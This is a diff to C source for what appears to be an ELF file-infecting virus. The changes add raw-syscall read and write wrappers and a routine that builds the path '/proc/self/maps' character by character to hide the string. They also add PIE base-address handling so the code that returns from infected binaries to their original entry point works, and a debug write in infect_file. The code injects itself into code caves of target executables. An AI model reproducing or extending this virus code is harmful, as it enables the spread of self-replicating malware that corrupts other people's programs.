@@ -42,6 +42,7 @@ __attribute__((always_inline)) inline void ft_exit(int exit_code);
 __attribute__((always_inline)) inline int ft_open(volatile char *path, volatile int flags, volatile mode_t mode);
 __attribute__((always_inline)) inline int ft_close(volatile int fd);
 __attribute__((always_inline)) inline int ft_getdents64(int fd, char dirp[], size_t count);
+__attribute__((always_inline)) inline int ft_read(int fd, volatile void *ptr, size_t size);
 __attribute__((always_inline)) inline int ft_write(int fd, volatile void *ptr, size_t size);
 __attribute__((always_inline)) inline int ft_lseek(int fd, off_t offset, int whence);
 __attribute__((always_inline)) inline uint64_t ft_mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
@@ -77,7 +78,63 @@ __attribute__((always_inline)) inline void ft_strncpy(volatile char *src, volati
 __attribute__((always_inline)) inline int ft_strstr(volatile char *haystack, volatile char *needle, size_t size);
 __attribute__((always_inline)) inline void ft_memcpy(volatile void *src, volatile void *dst, uint64_t size);
 
-__attribute__((always_inline)) inline void
+// __attribute__((always_inline)) static inline uint64_t parse_hex(volatile char* hex) {
+//     uint64_t result;
+
+//     for (int idx = 0; idx < 16; ++idx) {
+//         if (hex[idx] == '-') {
+//             break;
+//         }
+
+//         int digit;
+//         if (hex[idx] >= '0' && hex[idx] <= '9') {
+//             digit = hex[idx] - '0';
+//         } else if (hex[idx] >= 'a' && hex[idx] <= 'f') {
+//             digit = hex[idx] - ('a' - 10);
+//         } else {
+//             digit = hex[idx] - ('A' - 10);
+//         }
+
+//         result = result * 16 + digit;
+//     }
+
+//     return result;
+// }
+
+__attribute__((always_inline)) static inline uint64_t get_base_address() {
+    volatile static char mappings_path[16];
+    volatile char buffer[400];
+
+    mappings_path[0] = '/';
+    mappings_path[1] = 'p';
+    mappings_path[2] = 'r';
+    mappings_path[3] = 'o';
+    mappings_path[4] = 'c';
+    mappings_path[5] = '/';
+    mappings_path[6] = 's';
+    mappings_path[7] = 'e';
+    mappings_path[8] = 'l';
+    mappings_path[9] = 'f';
+    mappings_path[10] = '/';
+    mappings_path[11] = 'm';
+    mappings_path[12] = 'a';
+    mappings_path[13] = 'p';
+    mappings_path[14] = 's';
+    mappings_path[15] = '\0';
+
+    int fd = ft_open(mappings_path, O_RDONLY, 0);
+
+    // ft_read(fd, buffer, sizeof(buffer));
+
+    for (int idx = 0; idx < sizeof(buffer); ++idx) {
+        if (buffer[idx] == '\n') {
+            // return parse_hex(&buffer[idx + 1]);
+        }
+    }
+    return 0;
+}
+
+__attribute__((always_inline)) static inline void
 jump_back(int fd_self) {
     volatile file file_self;
 
@@ -100,10 +157,14 @@ jump_back(int fd_self) {
 
     Elf64_Ehdr *header = file_self.mem;
     uint64_t jump_to = header->e_entry + BUILDER_RE_ENTRY_OFFSET;
+    if (header->e_type == ET_DYN) {
+        jump_to += get_base_address();
+    }
     file_munmap(&file_self);
     ft_close(fd_self);
     __asm__ volatile("jmp *%0" : : "r"(jump_to));
 }
+
 void
 _start() {
     volatile static char path_self[16];
@@ -237,7 +298,6 @@ infect_file(volatile char *path, volatile file *file_self) {
         ft_close(fd_target);
         return 0;
     }
-
     uint64_t builder_target_start_offset = reserve_builder(&file_target, builder_self_start, builder_self_size, code_caves_target, code_caves_target_num);
     uint8_t not_enough_space_for_builder = builder_target_start_offset == 0;
     if (not_enough_space_for_builder) {
@@ -246,6 +306,11 @@ infect_file(volatile char *path, volatile file *file_self) {
         return 0;
     }
 
+    char ch = '!';
+    ft_write(1, &ch, 1);
+    ch = '\n';
+
+    ft_write(1, &ch, 1);
     Elf64_Ehdr *header_target = file_target.mem;
     // enlarge the program header that is the
     for (int i = 0; i < header_target->e_phnum; i++) {
@@ -639,6 +704,11 @@ ft_getdents64(int fd, char dirp[], size_t count) {
 __attribute__((always_inline)) inline int
 ft_write(int fd, volatile void *ptr, size_t size) {
     return sys(SYS_write, fd, (long)ptr, size, 0, 0, 0);
+}
+
+__attribute__((always_inline)) inline int
+ft_read(int fd, volatile void *ptr, size_t size) {
+    return sys(SYS_read, fd, (long)ptr, size, 0, 0, 0);
 }
 
 __attribute__((always_inline)) inline int
